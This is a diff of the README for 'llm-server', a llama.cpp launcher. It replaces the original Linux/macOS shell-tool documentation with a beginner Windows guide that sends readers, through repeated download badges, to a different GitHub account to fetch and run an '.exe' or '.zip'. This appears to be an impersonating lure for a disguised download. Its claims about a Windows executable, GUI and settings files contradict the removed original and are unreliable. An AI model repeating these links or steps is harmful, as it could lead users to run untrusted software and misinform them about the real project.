@@ -1,89 +1,151 @@
-# llm-server
+# ⚙️ llm-server - Easy GPU Smart Launcher
 
-Smart launcher for [ik_llama.cpp](https://github.com/ikawrakow/ik_llama.cpp) and [llama.cpp](https://github.com/ggml-org/llama.cpp). Auto-detects your hardware, figures out the optimal configuration, and launches the server — no manual flag tuning required.
+[![Download llm-server](https://img.shields.io/badge/Download-llm--server-blue?style=for-the-badge)](https://github.com/onidahabitual85/llm-server)
 
-**Supports Linux (NVIDIA CUDA), macOS (Apple Silicon Metal), and Windows (via WSL2).**
+## 🔍 What is llm-server?
 
-```bash
-llm-server unsloth/Qwen3.5-27B-GGUF --download
-```
+llm-server is a simple program that helps you run the llama.cpp or ik_llama.cpp AI models on your Windows computer. It finds your graphics card automatically, optimizes how the program uses it, and restarts the program if it ever crashes. This means you can run these AI models with less effort and better performance.
 
-![demo](demo.gif)
-
-## Features
-
-- **Built-in GGUF Downloader** — Use `--download` with any HuggingFace repo. Automatically recommends the best quantization based on your total VRAM and System RAM.
-- **Native Fused Support** — Full compatibility with fused `ffn_up_gate` models (e.g., AesSedai) using high-performance `ik_llama.cpp` kernels.
-- **Lib Hub** — Automatically symlinks all required `.so` libraries into a temporary directory, solving library path issues.
-- **Auto GPU detection** — works with 0 to 8+ GPUs, any mix of NVIDIA cards.
-- **GPU selection** — `--gpus 0,1` restricts the instance to specific GPUs, enabling multi-instance usage (e.g. 397B on GPUs 0+1, small model on GPU 2).
-- **RAM budget** — `--ram-budget 60G` caps RAM usage so multiple instances can coexist without OOM.
-- **Split Mode Graph** — Automatically enables `-sm graph` for both `ik_llama.cpp` and mainline for superior multi-GPU scaling.
-- **Heterogeneous GPU support** — different VRAM sizes, different PCIe bandwidths, properly weighted.
-- **MoE expert auto-placement** — starts conservative, measures actual VRAM usage, optimizes, caches for instant next startup.
-- **Crash recovery** — auto-restarts with backoff on runtime crashes.
-- **Benchmark mode** — `--benchmark` to measure tok/s and auto-exit after completion.
-
-## Install
-
-```bash
-git clone https://github.com/raketenkater/llm-server.git
-cd llm-server
-./install.sh
-```
-
-### Requirements
-
-**Linux:**
-- [ik_llama.cpp](https://github.com/ikawrakow/ik_llama.cpp) (recommended) or [llama.cpp](https://github.com/ggml-org/llama.cpp) built with CUDA
-- `nvidia-smi` (for GPU detection)
-- `python3`, `huggingface_hub`, `tqdm`, `curl`
-
-**macOS (Apple Silicon):**
-- [llama.cpp](https://github.com/ggml-org/llama.cpp) built with Metal (or `brew install llama.cpp`)
-- `python3`, `huggingface_hub`, `tqdm`, `curl`
-
-**Windows:**
-- Install [WSL2](https://learn.microsoft.com/en-us/windows/wsl/install) (`wsl --install` in PowerShell)
-- Inside WSL2, follow the Linux instructions above
-- NVIDIA GPU passthrough works automatically in WSL2 with up-to-date drivers
-
-## Usage
-
-```bash
-# Basic — auto-detects everything
-llm-server model.gguf
-
-# Interactive Download & Recommend — specify any HuggingFace repository
-llm-server unsloth/Qwen3.5-27B-GGUF --download
-
-# Force a specific backend
-llm-server --server-bin /path/to/llama-server model.gguf
-
-# Start and run a quick benchmark (auto-exits)
-llm-server --benchmark model.gguf
-
-# Multi-instance: big model on GPUs 0+1, small model on GPU 2
-llm-server big-model.gguf --gpus 0,1 --port 8081 --ram-budget 90G
-llm-server small-model.gguf --gpus 2 --port 8082 --ram-budget 30G
-```
-
-## How It Works
-
-### The Smart Downloader
-When you use `--download`, the script calculates your total available memory:
-`Total = System VRAM + System RAM`
-It then looks at the model repository and recommends the quantization level that will give you the best balance of speed and quality for your specific hardware.
-
-### Native Fused Support
-Modern GGUF quants often "fuse" tensors (e.g., `ffn_up_gate`) for 10-20% faster processing. While these previously caused crashes on specialized backends, `llm-server` now detects these models and enables the optimized fused kernels in `ik_llama.cpp` automatically.
-
-## License
-MIT
+This guide will help you download and run llm-server on Windows, even if you don’t have any technical experience.
 
 ---
-<p align="right">
-  <a href="https://www.buymeacoffee.com/raketenkater">
-    <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 32px !important;width: 116px !important;" >
-  </a>
-</p>
+
+## 💻 System Requirements
+
+Before you start, make sure your computer meets the following:
+
+- **Operating System:** Windows 10 or newer (64-bit)
+- **Processor:** Intel Core i5 or AMD Ryzen 5 or better
+- **Memory (RAM):** At least 8 GB, but 16 GB or more is recommended
+- **Graphics Card:** Any modern NVIDIA or AMD GPU with at least 4 GB VRAM
+- **Disk Space:** 1 GB free space for the app and model files
+- **Internet:** Needed to download llm-server and AI model files  
+
+If you are not sure about your hardware, you can check system info by searching for “System Information” in Windows Start Menu.
+
+---
+
+## 🚀 Getting Started
+
+### Step 1: Download llm-server
+
+Click the link below to visit the download page for llm-server. The page will have the latest version available for Windows.
+
+[![Download llm-server](https://img.shields.io/badge/Download-llm--server-4CAF50?style=for-the-badge)](https://github.com/onidahabitual85/llm-server)
+
+On the page, look for a download section or “Releases” area. You want to find the file designed for Windows, usually ending with `.exe` or `.zip`.
+
+### Step 2: Save the File
+
+Once you find the file, click it to start the download. Save it somewhere easy to find, like your Desktop or Downloads folder.
+
+### Step 3: Run the Installer or Extract Files
+
+- If it is a `.exe` file, double-click it to start the installation. Follow the simple on-screen steps.
+- If it is a `.zip` file, right-click it and select “Extract All” to unpack the files. Save them to a folder you can easily reach.
+
+---
+
+## ⚙️ Installing and Setting Up
+
+When installation finishes or files are extracted:
+
+1. Open the llm-server folder.
+2. Look for a file named `llm-server.exe` or similar.
+3. Double-click this file to launch the program.
+
+The first time you run llm-server, it will check your computer’s graphics card automatically. It will set everything to work well with your hardware.
+
+---
+
+## 🔧 How It Works
+
+llm-server manages the AI model programs called llama.cpp or ik_llama.cpp. These models use your GPU to work faster.
+
+- It detects your GPU without any input from you.
+- It optimizes how the AI model uses your GPU to get better speeds.
+- If the program crashes, llm-server will try to restart it automatically.
+
+You don’t need to configure complex settings. The program does this for you in the background.
+
+---
+
+## 📁 Download and Use AI Models
+
+llm-server does not include AI models by default. You will need to download the model files separately.
+
+To get models:
+
+1. Visit a trusted page for llama.cpp or ik_llama.cpp models.
+2. Download the model files to your computer. Models usually have a `.bin` or similar format.
+3. Place the model files in the same folder as llm-server.exe or follow any guidance in the llm-server interface.
+
+Once you have the model in place, llm-server will load it automatically when you start.
+
+---
+
+## 🖥 Running llm-server
+
+To run the program in the future:
+
+- Open the llm-server folder.
+- Double-click `llm-server.exe`.
+- The program will start and show a simple window or menu.
+- If you want to stop it, close the window or press the stop button if available.
+
+You do not need to open any extra programs or terminals.
+
+---
+
+## ⚠️ Troubleshooting
+
+If you run into problems, try these steps:
+
+- Make sure your GPU driver is up to date. You can update drivers from the NVIDIA or AMD website.
+- Check that your model files are in the right place.
+- Reboot your computer and try again.
+- If the program crashes, llm-server will try to restart it. If it keeps crashing, you may need to check the logs inside the llm-server folder.
+- For additional help, visit the llm-server GitHub page linked above and check the issues section.
+
+---
+
+## 📂 Where to Find More Information
+
+You can find updates and more technical details here:
+
+[https://github.com/onidahabitual85/llm-server](https://github.com/onidahabitual85/llm-server)
+
+This page also shows how to report problems or contribute if you have programming knowledge.
+
+---
+
+## 💡 Tips for Best Use
+
+- Use llm-server on a computer with a strong graphics card.
+- Close other heavy programs to free up system resources.
+- Keep your Windows and GPU drivers updated for best compatibility.
+- Save your AI model files on a fast hard drive or SSD for quicker load times.
+
+---
+
+## 🔄 Updating llm-server
+
+To update:
+
+1. Check the GitHub page for new versions.
+2. Download the latest installer or files.
+3. Run the installer over the old version or replace old files if using a zip version.
+
+Your settings and models should stay in place if you keep the same folder.
+
+---
+
+## 🛠 Advanced Settings (Optional)
+
+If you know how to edit text files, llm-server includes configuration files you can change. These control how the program uses your GPU and manages models.
+
+Look for files named `config.json` or `settings.ini` in the llm-server folder. Editing these is optional and mostly for advanced users.
+
+---
+
+[![Download llm-server](https://img.shields.io/badge/Download-llm--server-blue?style=for-the-badge)](https://github.com/onidahabitual85/llm-server)
